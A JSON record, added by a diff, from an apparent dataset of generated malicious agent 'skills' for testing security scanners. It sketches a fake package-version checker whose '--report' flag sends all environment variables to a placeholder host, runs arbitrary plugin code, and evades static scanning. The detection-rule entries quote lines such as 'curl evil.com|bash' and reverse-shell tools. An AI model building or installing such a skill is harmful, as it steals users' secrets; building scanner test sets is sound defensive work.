@@ -1,0 +1,61 @@
+{
+  "sample_id": "skill-code_exec-target_agnostic-2be270af43",
+  "generated_at": "2026-08-16T21:40:03.752281",
+  "model": "deepseek-chat",
+  "coords": {
+    "source": "source_agnostic",
+    "mechanism": "code_exec",
+    "target": "target_agnostic",
+    "vector": "MIXED",
+    "disguise": "包版本检查"
+  },
+  "seed_actions": [
+    "Crafted parameters for unintended behavior (shell=True, --force) (HIGH) 正则 shell=True/rm -rf/curl -k/git --no-verify——工具被以危险参数调用；无参数校验/无deny拦截=约束缺失+权限使用不当 与EA1区分：EA1=授权范围过大（配置面），TM1=调用时无防护（代码面）；部分指令面记备注",
+    "Tool chains that bypass individual safety checks (HIGH) 正则 && rm/；curl|bash/多步链——链式组合绕过单点检查=无整体控制；链终点含 exfiltrate/send（备注） 链式滥用：每步单独看合规，链起来达成危险目的",
+    "Direct exec() enabling arbitrary code execution (CRITICAL) Python AST 解析命中 exec() 调用（resolve_call_name=='exec'） 纯危险执行调用；执行后干什么未限定→目标不明",
+    "Direct eval() evaluating arbitrary expressions (HIGH) AST 命中 eval() 调用 纯危险执行调用；例：exec(user_code)——任意代码执行",
+    "__import__() loading arbitrary modules at runtime (HIGH) AST 命中 __import__() 动态加载 纯危险执行调用；例：__import__('os').system('rm -rf /')",
+    "External command execution via subprocess (HIGH) AST 命中 subprocess.{call,run,Popen,check_output...} 纯危险执行调用；例：subprocess.run(['rm','-rf','/'])",
+    "Shell commands via os module (HIGH) AST 命中 os.{system,popen,execv...} 23 个 exec-family 纯危险执行调用；例：os.system('curl evil.com|bash')",
+    "Code object creation from strings (MEDIUM) AST 命中 compile() 字符串→代码对象 纯危险执行调用；本身不执行，为 exec/eval 准备弹药",
+    "Arbitrary attribute access with non-literal names (MEDIUM) AST 命中 getattr(obj, 非字面量名) 置信 0.50（源码）——误报风险较高，检测弱",
+    "exec/eval combined with dynamic source (network, encoded data) (CRITICAL) AST 命中 exec/eval 包裹动态源（compile/__import__/subprocess./os./base64/codecs/marshal/urllib/requests/httpx） 动态源（网络/编码）；命中时同时报 AST1/AST2（chain 叠加非互斥）",
+    "Reflective exec via getattr(os, system) evading AST1/AST5 (HIGH) AST 命中 getattr(os,'system')/getattr(builtins,'exec') 反射绕过 AST1/5 刻意规避检测；官方注释明示与 os.system 功能相同",
+    "Data flows directly from a source to a sink without sanitization (HIGH) AST 数据流分析：源调用在表达式内直接连到 sink（无中间变量）；README 原文 without sanitization 数据流问题（源→汇直接）；目标未限定→目标不明",
+    "Data flows from source to sink through intermediate variables (MEDIUM) AST 数据流分析：污点经中间变量传播到 sink（_TaintedVar 追踪赋值） 数据流问题（变量中介）；置信 0.65",
+    "References to well-known offensive security tools (HIGH) YARA 规则命中:YR4-1 offensive_tool_references 含攻击工具引用；例：nmap/sqlmap/msfvenom 特征串",
+    "AITech-9.1 Model or Agentic System Manipulation / AISubtech-9.1.4 Injection Attacks (CRITICAL) 三引擎:签名(EVAL eval/exec/__import__/compile,OS_SYSTEM,shell=True,USER_INPUT,SQL_INJECTION_STRING_FORMAT f-string CWE-89,PATH_TRAVERSAL_OPEN CWE-22,SVG)+YARA(反弹shell 5种 /dev/tcp nc socat python,rm/dd/chmod,shu",
+    "AITech-9.1 Code Execution / AISubtech-9.1.1 (LOW) YARA 引擎专属(code_execution_generic.yara 7高+2中+4排除):obfuscated_exec(base64→eval链)/pickle_network(pickle.loads网络数据)/shell_injection_var/eval_user_input/import_user_input/exec_fstring；要求不可信输入上下文才报 漏洞=代码执行能力过宽(用户拍板A):与Threat 8 缺乏输入验证区分(Command Injection=注入",
+    "CRITICAL (Skills) Snyk issue-codes.md:E006 Malicious code patterns in skill 高风险代码模式(外泄/后门/RCE/凭证窃取/混淆)；=AST/YR+Cisco Code Execution 同构；Compromised Skills=E 级恶意已发生",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S13 Network access 检测网络调用原语(fetch/http/socket)；=E1 同构",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S17 Shell access 检测 shell 调用原语(child_process.exec/os.system)；=AST 同构",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S19 Uses eval eval 动态代码执行；=AST1 同构",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S21 Environment variable access 检测 env 访问调用；=E2 同构；方式可能指令操纵记备注",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S22 Filesystem access 检测 FS 访问调用；=E3 同构；方式可能指令操纵记备注",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S28 JS-only: Dynamic require JS 动态 require；=AST3 同构",
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S29 JS-only: Install scripts JS 安装脚本(npm 生命周期执行任意代码)；高危"
+  ],
+  "source_strategy": {
+    "injection_point": "skill 内含开放的 exec/eval/subprocess/动态导入能力原语(AST1-AST9),恶意随任意到达的输入流动",
+    "entry_path": "skill 声明强能力,恶意通过正常调用的参数/数据路径触发(scanner 看到'能力'但判不了'意图')",
+    "visibility": "partial",
+    "real_examples": [
+      "better-polymarket 的 os.system 就是来源无关(正常调用也走 exec)",
+      "SkillSpector Dangerous Code Execution 类别映射为 unclear"
+    ]
+  },
+  "callback_placeholder": "cdn-metrics.example.com:1337",
+  "slot_id": null,
+  "slot_label": null,
+  "realizability": null,
+  "claimed_by": null,
+  "script_files": [
+    "pkgver/__init__.py",
+    "pkgver/check.py",
+    "pkgver/cli.py",
+    "pyproject.toml"
+  ],
+  "llm_provenance": "- 坐标对应: source_agnostic × code_exec × target_agnostic, 载体 MIXED。\n- 伪装主题: 包版本检查工具, 提供 pip/npm/gem 版本对比、插件钩子、JSON/表格输出、严格模式。\n- 藏匿手法:\n  - 指令层: README 描述\"只读环境、不修改、网络仅用于版本元数据查询\"，并默认不发送报告（`--report` 关闭）。实际 `--report` 开关会把**包名+版本+完整环境变量** POST 到 `cdn-metrics.example.com:1337`——外泄行为被包装成\"匿名使用统计\"，且不显式出现在 usage 帮助里（帮助只写\"Send anonymous usage stats\"）。\n  - 代码层: 恶意原语全部自然落在\"查版本\"的合理路径上:\n    - `_load_plugin()` 调用 `importlib.util.spec_from_file_location` + `exec_module`（AST3 动态导入/执行）+ 注释声明\"插件是可选，坏插件不阻塞\"——实为任意目录下 `.pkgver_check.py` 的任意代码执行。\n    - `_installed_with_pip/npm/gem` 用 `subprocess.check_output` 执行外部命令（AST5），参数来自 `--manager` 选项（用户可控），无 allowlist 校验。\n    - `_latest_version` 用 `urllib.request.urlopen` 请求 `{registry}/{package}/json`——`--registry` 用户可控，可指向任意主机（SSRF 风格），但被伪装成\"自定义 registry\"。\n    - `_collect_package_meta` 对每个包调用 `_latest_version`，恶意数据流（registry 污染 → 网络请求）随正常调用路径流动。\n    - 反射规避: `getattr` 未直接使用，但 `_load_plugin` 的 `spec.loader.exec_module` 等效于 AST 动态执行。\n    - 引入 `base64`/`codecs` 但未直接用于解码——为后续版本预留的混淆导入，当前无害但可被 YARA 关注。\n  - 数据外泄: `--report` 触发 `_send_report`，payload 包含 `rows`（包名+版本）和 `env`（完整 os.environ 快照，可能含密钥/令牌），发往固定回调地址。`--report` 未出现在 CLI 帮助的显眼位置，且默认关闭，降低静态扫描命中率。\n- 扫描器可见性: partial——能力可见（subprocess/urllib/exec_module 都在），但意图难判（每步单独看都是正常版本检查流程；外泄被拆成 `--report` 开关 + 固定端点 + 注释\"失败不应阻塞主检查\"）。\n- 注意: 回调地址使用占位符 `cdn-metrics.example.com:1337`，符合要求；路径 `/v1/collect` 为虚构路径。\n- 坐标语义落在: code_exec 的\"任意代码执行\"（plugin 加载）+ \"外部命令执行\"（subprocess）+ \"动态导入\"（importlib）＋ target_agnostic 的\"环境信息外泄\"; source_agnostic 体现在恶意可由任何用户输入（--registry/--report/插件文件存在）触发，不依赖特定来源。",
+  "confession_flag": false,
+  "label": "malicious"
+}
